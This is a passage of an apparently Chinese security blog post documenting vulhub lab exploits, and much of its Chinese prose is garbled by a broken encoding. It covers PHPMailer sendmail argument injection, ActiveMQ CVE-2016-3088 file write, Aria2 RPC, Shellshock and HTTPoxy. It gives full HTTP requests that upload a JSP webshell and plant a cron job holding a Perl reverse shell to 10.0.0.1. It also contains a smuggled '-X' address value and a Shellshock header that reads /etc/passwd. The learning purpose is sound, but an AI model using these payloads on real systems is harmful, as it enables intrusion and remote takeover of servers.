class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;PHPMailer/PHPMailerAutoload.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">send</span>(<span class="params"><span class="variable">$from</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$mail</span> = <span class="keyword">new</span> <span class="title class_">PHPMailer</span>;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$mail</span>-&gt;<span class="title function_ invoke__">setFrom</span>(<span class="variable">$from</span>);</span><br><span class="line">    <span class="variable">$mail</span>-&gt;<span class="title function_ invoke__">addAddress</span>(<span class="string">&#x27;joe@example.net&#x27;</span>, <span class="string">&#x27;Joe User&#x27;</span>);     <span class="comment">// Add a recipient</span></span><br><span class="line"></span><br><span class="line">    <span class="variable">$mail</span>-&gt;<span class="title function_ invoke__">isHTML</span>(<span class="literal">true</span>);                                  <span class="comment">// Set email format to HTML</span></span><br><span class="line"></span><br><span class="line">    <span class="variable">$mail</span>-&gt;Subject = <span class="string">&#x27;&lt;?php phpinfo(); ?&gt;&#x27;</span>;</span><br><span class="line">    <span class="variable">$mail</span>-&gt;Body    = <span class="string">&#x27;This is the HTML message body &lt;b&gt;in bold!&lt;/b&gt;&#x27;</span>;</span><br><span class="line">    <span class="variable">$mail</span>-&gt;AltBody = <span class="string">&#x27;This is the body in plain text for non-HTML mail clients&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!<span class="variable">$mail</span>-&gt;<span class="title function_ invoke__">send</span>()) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;Message could not be sent.&#x27;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;Mailer Error: &#x27;</span> . <span class="variable">$mail</span>-&gt;ErrorInfo;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;Message has been sent&#x27;</span> . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">unset</span>(<span class="variable">$mail</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$address</span> = <span class="string">&quot;aaa( -X/home/www/success.php )@qq.com&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">send</span>(<span class="variable">$address</span>);</span><br></pre></td></tr></table></figure><p>æ‰§è¡Œä¹‹åå¯ä»¥å‘ç°å·²ç»å†™äº†shelläº† (è™½ç„¶æˆ‘å¹¶æ²¡æœ‰æ‰§è¡ŒæˆåŠŸ...) ç„¶åphithonå¸ˆå‚…è¿˜ç»™äº†ä¸ªæƒé™ä¸å¤Ÿçš„æ—¶å€™çš„payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aaa( -X/home/www/success.php -OQueueDirectory=/tmp )@qq.com</span><br></pre></td></tr></table></figure><h2 id="activemqä»»æ„æ–‡ä»¶å†™å…¥æ¼æ´cve-2016-3088">ActiveMQä»»æ„æ–‡ä»¶å†™å…¥æ¼æ´(CVE-2016-3088)</h2><h3 id="åŸç†-1">åŸç†</h3><p>ActiveMQçš„webæ§åˆ¶å°åˆ†ä¸‰ä¸ªåº”ç”¨ï¼Œadminã€apiå’Œfileserverï¼Œå…¶ä¸­adminæ˜¯ç®¡ç†å‘˜é¡µé¢ï¼Œapiæ˜¯æ¥å£ï¼Œfileserveræ˜¯å‚¨å­˜æ–‡ä»¶çš„æ¥å£ï¼›adminå’Œapiéƒ½éœ€è¦ç™»å½•åæ‰èƒ½ä½¿ç”¨ï¼Œfileserveræ— éœ€ç™»å½•ã€‚ fileserveræ˜¯ä¸€ä¸ªRESTful APIæ¥å£ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡GETã€PUTã€DELETEç­‰HTTPè¯·æ±‚å¯¹å…¶ä¸­å­˜å‚¨çš„æ–‡ä»¶è¿›è¡Œè¯»å†™æ“ä½œï¼Œå…¶è®¾è®¡ç›®çš„æ˜¯ä¸ºäº†å¼¥è¡¥æ¶ˆæ¯é˜Ÿåˆ—æ“ä½œä¸èƒ½ä¼ è¾“ã€å­˜å‚¨äºŒè¿›åˆ¶æ–‡ä»¶çš„ç¼ºé™·ï¼Œä½†åæ¥å‘ç°ï¼š å…¶ä½¿ç”¨ç‡å¹¶ä¸é«˜ æ–‡ä»¶æ“ä½œå®¹æ˜“å‡ºç°æ¼æ´ æ‰€ä»¥ï¼ŒActiveMQåœ¨<strong>5.12.x~5.13.x</strong>ç‰ˆæœ¬ä¸­ï¼Œå·²ç»é»˜è®¤å…³é—­äº†fileserverè¿™ä¸ªåº”ç”¨ï¼ˆä½ å¯ä»¥åœ¨conf/jetty.xmlä¸­å¼€å¯ä¹‹ï¼‰ï¼›åœ¨<strong>5.14.0ç‰ˆæœ¬ä»¥åï¼Œå½»åº•åˆ é™¤äº†fileserveråº”ç”¨</strong>ã€‚ åœ¨æµ‹è¯•è¿‡ç¨‹ä¸­ï¼Œå¯ä»¥å…³æ³¨ActiveMQçš„ç‰ˆæœ¬ï¼Œé¿å…èµ°å¼¯è·¯ã€‚ æœ¬æ¬¡æ¼æ´å‡ºç°åœ¨fileserveråº”ç”¨ä¸­,fileserveræ”¯æŒå†™å…¥æ–‡ä»¶,åŒæ—¶æ”¯æŒç§»åŠ¨æ–‡ä»¶,æ‰€ä»¥æˆ‘ä»¬åªè¦å†™å…¥ä¸€ä¸ªæ–‡ä»¶ç„¶åç§»åŠ¨å°±å¯ä»¥é€ æˆä»»æ„æ–‡ä»¶å†™å…¥. å‚è€ƒredisçš„getshell,åŒæ ·æœ‰å‡ ç§åˆ©ç”¨æ–¹æ³•</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1.å†™å…¥webshell</span><br><span class="line">2.å†™å…¥cronæˆ–è€…ssh keyç­‰</span><br><span class="line">3.å†™å…¥jaræˆ–jetty.xmlç­‰åº“å’Œé…ç½®æ–‡ä»¶(ä¸å¤ªæ‡‚)</span><br></pre></td></tr></table></figure><h3 id="æ­ç¯å¢ƒ-1">æ­ç¯å¢ƒ</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker-compose build</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure><p>ç„¶åç¯å¢ƒä¼šç›‘å¬8161ç«¯å£å’Œ61616ç«¯å£,å…¶ä¸­8161æ˜¯webæ§åˆ¶å°ç«¯å£,è€Œæ¼æ´å°±å‡ºç°åœ¨è¿™ä¸ªç«¯å£,æˆ‘ä»¬è®¿é—®<code>http://192.168.0.104:8161</code>çœ‹åˆ°webé¡µé¢å³æˆåŠŸè¿è¡Œ <img src="/images/2018/07/vul-1.jpg" alt="blacsheep" /> å…¶ä¸­adminé¡µé¢çš„é»˜è®¤ç™»å½•å¸å·å¯†ç éƒ½æ˜¯admin</p><h3 id="æ”»å‡»-1">æ”»å‡»</h3><h4 id="å†™webshell">å†™webshell</h4><p>å†™webshellè¦æ±‚ç™»å½•è¿›å»,é»˜è®¤å¸å·å¯†ç admin,è®¿é—®<code>http://ip_address:8161/admin/test/systemProperties.jsp</code>ç„¶åå¾—åˆ°ActiveMQçš„é»˜è®¤è·¯å¾„: <img src="/images/2018/07/vul-2.jpg" alt="blacsheep" /> ç„¶åä¼ webshell</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">PUT</span> <span class="string">/fileserver/1.txt</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>localhost:8161</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9,en;q=0.8</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>36164</span><br><span class="line"></span><br><span class="line"><span class="language-gams"><span class="function"><span class="title">webshell</span></span>...</span></span><br></pre></td></tr></table></figure><figure><img src="/images/2018/07/vul-3.jpg" alt="blacsheep" /><figcaption aria-hidden="true">blacsheep</figcaption></figure><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">MOVE</span> <span class="string">/fileserver/1.txt</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Destination</span><span class="punctuation">: </span>file:///opt/activemq/webapps/api/shell.jsp</span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>localhost:8161</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9,en;q=0.8</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>0</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/images/2018/07/vul-4.jpg" alt="blacsheep" /> ç„¶åè¿ä¸Šå»å°±å¯ä»¥äº† <img src="/images/2018/07/vul-5.jpg" alt="blacsheep" /></p><h4 id="å†™å…¥crontabè‡ªåŠ¨åå¼¹shell">å†™å…¥crontab,è‡ªåŠ¨åå¼¹shell</h4><p>é¦–å…ˆä¼ croné…ç½®æ–‡ä»¶,ç„¶åç§»åŠ¨åˆ°/etc/cron.d/root</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">PUT</span> <span class="string">/fileserver/1.txt</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>localhost:8161</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>en</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>248</span><br><span class="line"></span><br><span class="line"><span class="language-tcl">*/<span class="number">1</span> * * * * root /usr/bin/perl -e &#x27;use Socket;<span class="variable">$i</span>=<span class="string">&quot;10.0.0.1&quot;</span>;<span class="variable">$p</span>=<span class="number">21</span>;<span class="keyword">socket</span>(S,PF_INET,SOCK_STREAM,getprotobyname(<span class="string">&quot;tcp&quot;</span>));<span class="keyword">if</span>(connect(S,sockaddr_in(<span class="variable">$p</span>,inet_aton(<span class="variable">$i</span>))))&#123;<span class="keyword">open</span>(STDIN,<span class="string">&quot;&gt;&amp;S&quot;</span>);<span class="keyword">open</span>(STDOUT,<span class="string">&quot;&gt;&amp;S&quot;</span>);<span class="keyword">open</span>(STDERR,<span class="string">&quot;&gt;&amp;S&quot;</span>);<span class="keyword">exec</span>(<span class="string">&quot;/bin/sh -i&quot;</span>);&#125;;&#x27;</span></span><br><span class="line"><span class="language-tcl"><span class="comment">##</span></span></span><br></pre></td></tr></table></figure><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">MOVE</span> <span class="string">/fileserver/1.txt</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Destination</span><span class="punctuation">: </span>file:///etc/cron.d/root</span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>localhost:8161</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>en</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>0</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>å¾—åˆ°åå¼¹çš„shell <img src="/images/2018/07/vul-6.jpg" alt="blacsheep" /></p><h3 id="åˆ†æ-1">åˆ†æ</h3><p>æ²¡å•¥å¥½åˆ†æçš„,å°±æ˜¯ä¸€ä¸ªå¯¹ä»»æ„æ–‡ä»¶å†™çš„ç®€å•åˆ©ç”¨</p><h2 id="aria2-ä»»æ„æ–‡ä»¶å†™å…¥æ¼æ´">Aria2 ä»»æ„æ–‡ä»¶å†™å…¥æ¼æ´</h2><h3 id="åŸç†-2">åŸç†</h3><p>aria2æ˜¯ä¸€ä¸ªå‘½ä»¤è¡Œä¸‹çš„è½»é‡çº§ä¸‹è½½å·¥å…·,å†…å»ºxml-rpcå’Œjson-rpcçš„æ¥å£,åœ¨æœ‰æƒé™çš„æƒ…å†µä¸‹æˆ‘ä»¬å¯ä»¥æ“ä½œæ¥å£æ¥ä¸‹è½½æ–‡ä»¶,å°†æ–‡ä»¶ä¸‹è½½åˆ°ä»»æ„ç›®å½•,é€ æˆä»»æ„æ–‡ä»¶å†™å…¥ å‚è€ƒæ–‡ç« :<a href="https://paper.seebug.org/120/" title="https://paper.seebug.org/120/">https://paper.seebug.org/120/</a></p><h3 id="æ­ç¯å¢ƒ-2">æ­ç¯å¢ƒ</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure><p>6800æ˜¯aria2çš„rpcé»˜è®¤ç«¯å£,ç¯å¢ƒå¯åŠ¨ä¹‹åè®¿é—®<code>http://your_ip:6800</code>å‘ç°æœåŠ¡å·²ç»å¯åŠ¨å¹¶ä¸”è¿”å›404</p><h3 id="æ”»å‡»-2">æ”»å‡»</h3><p>ç”±äºè¿™é‡Œéœ€è¦è¿›è¡Œrpcé€šä¿¡,æ¯”è¾ƒéº»çƒ¦,ä½¿ç”¨ä¸€ä¸ªç¬¬ä¸‰æ–¹çš„gui <a href="https://github.com/binux/yaaw" title="https://github.com/binux/yaaw">https://github.com/binux/yaaw</a> ä½¿ç”¨éå¸¸ç®€å•,è§£å‹ä¹‹åæ‰“å¼€indexå³å¯,ç„¶åè¿›è¡Œç®€å•é…ç½® <img src="/images/2018/07/vul-8.jpg" alt="blacsheep" /> <img src="/images/2018/07/vul-9.jpg" alt="blacsheep" /> ç„¶åæˆ‘ä»¬åªç”¨æ–°å»ºä¸‹è½½ä»»åŠ¡,å°±å¯ä»¥å°†ä»»åŠ¡ç›®æ ‡ä¸‹è½½åˆ°æœåŠ¡å™¨çš„æŒ‡å®šä½ç½®äº†,æ¯”å¦‚æˆ‘ä»¬å†™ä¸€ä¸ªæ–‡ä»¶åˆ°/etc/cron.dä¸‹,è®©å®ƒæ‰§è¡Œä¸€ä¸ªåå¼¹shellçš„æ“ä½œ <img src="/images/2018/07/vul-10.jpg" alt="blacsheep" /> ç„¶åadd,æˆæœçš„è¯ä¼šæ˜¾ç¤º <img src="/images/2018/07/vul-11.jpg" alt="blacsheep" /> ç„¶åè„¸ä¸Šshellæ–‡ä»¶é‡Œé¢å†™çš„ipå³å¯æ‹¿åˆ°shell <img src="/images/2018/07/vul-7.jpg" alt="blacsheep" /></p><h3 id="åˆ†æ-2">åˆ†æ</h3><p>åœ¨æœªè®¾ç½®ä»»ä½•å®‰å…¨æªæ–½çš„æƒ…å†µä¸‹ï¼ŒAria2 RPC Server å¯ä»¥æ¥å—ä»»ä½•æœªçŸ¥æ¥æºçš„è¯·æ±‚æŒ‡ä»¤ï¼Œå¹¶äºˆä»¥ä¸‹è½½ã€‚å³ä½¿å­˜åœ¨è¯¸å¦‚--rpc-secretã€--rpc-userã€--rpc-passwdä¹‹ç±»çš„å®‰å…¨æªæ–½ï¼Œä¹Ÿå¯ä»¥é€šè¿‡ç¤¾ä¼šå·¥ç¨‹å­¦æ‰‹æ®µè¿›è¡Œæ”»å‡»ã€‚é€šè¿‡ Aria2 RPC Serverï¼Œå¯ä»¥è¿›è¡Œ SSRFã€Arbitrary File Write ç­‰ Web æ”»å‡»æ‰‹æ³•ï¼Œè·å–æœåŠ¡å™¨æƒé™ã€‚ å…¶å®è¯´åˆ°åº•è¿˜æ˜¯å®‰å…¨è®¤è¯æ²¡åšå¥½,è¿™ä¸ªå°±æ˜¯ä¸€ä¸ªè£¸çš„ä»»æ„æ–‡ä»¶ä¸Šä¼ ,æ²¡å•¥å¥½è¯´çš„,åšå¥½è®¤è¯çš„è¯å¯èƒ½ä¼šå¥½ä¸€äº›</p><h2 id="shellç ´å£³æ¼æ´cve-2014-6271">Shellç ´å£³æ¼æ´(CVE-2014-6271)</h2><h3 id="åŸç†-3">åŸç†</h3><p>ç›®å‰çš„bashä½¿ç”¨çš„ç¯å¢ƒå˜é‡æ˜¯é€šè¿‡å‡½æ•°åç§°æ¥è°ƒç”¨çš„ï¼Œå¯¼è‡´æ¼æ´å‡ºé—®é¢˜æ˜¯ä»¥â€œ(){â€å¼€å¤´å®šä¹‰çš„ç¯å¢ƒå˜é‡åœ¨å‘½ä»¤ENVä¸­è§£ææˆå‡½æ•°åï¼ŒBashæ‰§è¡Œå¹¶æœªé€€å‡ºï¼Œè€Œæ˜¯ç»§ç»­è§£æå¹¶æ‰§è¡Œshellå‘½ä»¤ã€‚æ ¸å¿ƒçš„åŸå› åœ¨äºåœ¨è¾“å…¥çš„è¿‡æ»¤ä¸­æ²¡æœ‰ä¸¥æ ¼é™åˆ¶è¾¹ç•Œï¼Œæ²¡æœ‰åšåˆæ³•åŒ–çš„å‚æ•°åˆ¤æ–­ã€‚</p><h3 id="æ­ç¯å¢ƒ-3">æ­ç¯å¢ƒ</h3><p>è¿˜æ˜¯ç”¨çš„vulhubé‡Œé¢çš„docker</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker-compose build</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure><h3 id="æ”»å‡»-3">æ”»å‡»</h3><p>è¿™ä¸ªæ¼æ´æœ¬æ¥æ˜¯shellé‡Œç¯å¢ƒå˜é‡çš„æ¼æ´,ä¸è¿‡å¦‚æœç¬¬ä¸‰æ–¹è½¯ä»¶ç”¨åˆ°äº†shell,é‚£ä¹ˆå°±å¯ä»¥å¯¼è‡´é—®é¢˜çš„å‡ºç°,æ¯”è¾ƒå…¸å‹çš„æ˜¯apache,æ€»çš„åŸç†å›¾å¦‚ä¸‹ <img src="/images/2018/07/vul-12.png" alt="blacsheep" /></p><h4 id="æœ¬åœ°æµ‹è¯•">æœ¬åœ°æµ‹è¯•</h4><p>å¯ä»¥åœ¨shellé‡Œé¢æ‰§è¡Œ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">env x=&#x27;() &#123; :;&#125;; echo Vulnerable CVE-2014-6271 &#x27; bash -c &quot;echo test&quot;</span><br></pre></td></tr></table></figure><p>å¦‚æœå‡ºç°äº†<code>Vulnerable CVE-2014-6271</code>åˆ™å­˜åœ¨æ­¤æ¼æ´,æ¯”å¦‚ <img src="/images/2018/07/vul-13.png" alt="blacsheep" /></p><h4 id="è¿œç¨‹åˆ©ç”¨">è¿œç¨‹åˆ©ç”¨</h4><p>å¦‚æœæŸapacheåˆ©ç”¨çš„æ˜¯shellçš„è§£æ,è€Œä¸”shellç‰ˆæœ¬å¾ˆä½çš„è¯,å°±å¯ä»¥å¯¼è‡´ä»»æ„å‘½ä»¤æ‰§è¡Œ</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/victim.cgi</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>192.168.0.104</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>en</span><br><span class="line"><span class="attribute">x</span><span class="punctuation">: </span>() &#123; : ; &#125;;a=`/bin/cat /etc/passwd`;echo $a;</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>1</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><figure><img src="/images/2018/07/vul-14.jpg" alt="blacsheep" /><figcaption aria-hidden="true">blacsheep</figcaption></figure><h3 id="åˆ†æ-3">åˆ†æ</h3><p>ä»¥â€œ(){â€å¼€å¤´å®šä¹‰çš„ç¯å¢ƒå˜é‡åœ¨å‘½ä»¤ENVä¸­è§£ææˆå‡½æ•°åï¼ŒBashæ‰§è¡Œå¹¶æœªé€€å‡ºï¼Œè€Œæ˜¯ç»§ç»­è§£æå¹¶æ‰§è¡Œshellå‘½ä»¤ã€‚æ ¸å¿ƒçš„åŸå› åœ¨äºåœ¨è¾“å…¥çš„è¿‡æ»¤ä¸­æ²¡æœ‰ä¸¥æ ¼é™åˆ¶è¾¹ç•Œï¼Œæ²¡æœ‰åšåˆæ³•åŒ–çš„å‚æ•°åˆ¤æ–­ è¡¥ä¸ä¸­å·²ç»ä¿®å¤ <img src="/images/2018/07/vul-15.jpg" alt="blacsheep" /></p><h2 id="httpoxyæ¼æ´cve-2016-5385">HTTPoxyæ¼æ´(CVE-2016-5385)</h2><h3 id="åŸç†-4">åŸç†</h3><p>å‚è€ƒ<a href="http://www.laruence.com/2016/07/19/3101.html" title="http://www.laruence.com/2016/07/19/3101.html">http://www.laruence.com/2016/07/19/3101.html</a> æ¼æ´åŸå› ç®€è€Œè¨€ä¹‹å°±æ˜¯cgi(fastcgi)è¦å°†ç”¨æˆ·ä¼ å…¥çš„æ‰€æœ‰httpå¤´éƒ½åŠ ä¸Š<code>HTTP_</code>çš„å‰ç¼€æ³¨å†Œç¯å¢ƒå˜é‡,è€Œæœ‰äº›åº“ä¼šç”¨åˆ°ç¯å¢ƒå˜é‡é‡Œé¢çš„<code>HTTP_PROXY</code>æ¥ä½œä¸ºhttpçš„ä»£ç†,é‚£ä¹ˆå°±ä¼šå¯¼è‡´æ¶æ„ç”¨æˆ·æäº¤æ¶æ„å¤´éƒ¨æ¥çªƒå–æ•°æ®åŒ…ä¸­çš„æ•æ„Ÿä¿¡æ¯. PHP5.6.24ä¿®å¤äº†æ­¤æ¼æ´,æ‰€ä»¥æœ¬æ¬¡é‡‡ç”¨PHP5.6.23</p><h3 id="æ­ç¯å¢ƒ-4">æ­ç¯å¢ƒ</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker-compose build</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure><p>ç„¶åè®¿é—®<code>http://your_ip/index.php</code>å°±å¯ä»¥çœ‹åˆ°originçš„æœåŠ¡å™¨ip</p><h3 id="æ”»å‡»-4">æ”»å‡»</h3><p>æˆ‘ä»¬åœ¨å¤´éƒ¨åŠ ä¸ŠPROXYéƒ¨åˆ†</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>192.168.0.104</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9,en;q=0.8</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">PROXY</span><span class="punctuation">: </span>http://xx.xx.xx.xx:xx</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>ç„¶åvpsä¸Šé¢è½¬å‘çš„æ—¶å€™æ”¶åˆ°åŒ… <img src="/images/2018/07/vul-16.jpg" alt="blacsheep" /></p><h3 id="åˆ†æ-4">åˆ†æ</h3><p>ç®€è€Œè¨€ä¹‹å°±æ˜¯phpæŸäº›åº“è¿›è¡Œç½‘ç»œè®¿é—®çš„æ—¶å€™ä¼šç”¨åˆ°åä¸º<code>HTTP_PROXY</code>çš„ç¯å¢ƒå˜é‡ä½œä¸ºä»£ç†,è€Œè¿™ä¸ªå˜é‡åœ¨cgiä¸­å¯æ§,ä»è€Œå¯¼è‡´ä¸€äº›é—®é¢˜. é¿å…æ–¹å¼: å¦‚æœæ˜¯nginxçš„è¯å¯ä»¥åŠ ä¸Š<code>fastcgi_param HTTP_PROXY "";</code> å¦‚æœæ˜¯åº“çš„ä½œè€…é‚£ä¹ˆè¯·ä¸è¦ç›¸ä¿¡<code>HTTP_PROXY</code>çš„ç¯å¢ƒå˜é‡</p><h2 id="tomcat7å¼±å£ä»¤åå°getshell">tomcat7å¼±å£ä»¤åå°getshell</h2><h3 id="åŸç†-5">åŸç†</h3><p>tomcatå¦‚æœç™»å½•åˆ°åå°ä¸”æ²¡æœ‰å…³é—­manageåŠŸèƒ½,é‚£ä¹ˆå°±å¯ä»¥é€šè¿‡éƒ¨ç½²waræ–‡ä»¶æ¥getshell tomcatçš„åå°åŠŸèƒ½</p><ul><li>managerï¼ˆåå°ç®¡ç†ï¼‰<ul><li>manager-gui æ‹¥æœ‰htmlé¡µé¢æƒé™</li><li>manager-status æ‹¥æœ‰æŸ¥çœ‹statusçš„æƒé™</li><li>manager-script æ‹¥æœ‰textæ¥å£çš„æƒé™ï¼Œå’Œstatusæƒé™</li><li>manager-jmx æ‹¥æœ‰jmxæƒé™ï¼Œå’Œstatusæƒé™</li></ul></li><li>host-managerï¼ˆè™šæ‹Ÿä¸»æœºç®¡ç†ï¼‰<ul><li>admin-gui æ‹¥æœ‰htmlé¡µé¢æƒé™</li><li>admin-script æ‹¥æœ‰textæ¥å£æƒé™</li></ul></li></ul><h3 id="æ­ç¯å¢ƒ-5">æ­ç¯å¢ƒ</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure><h3 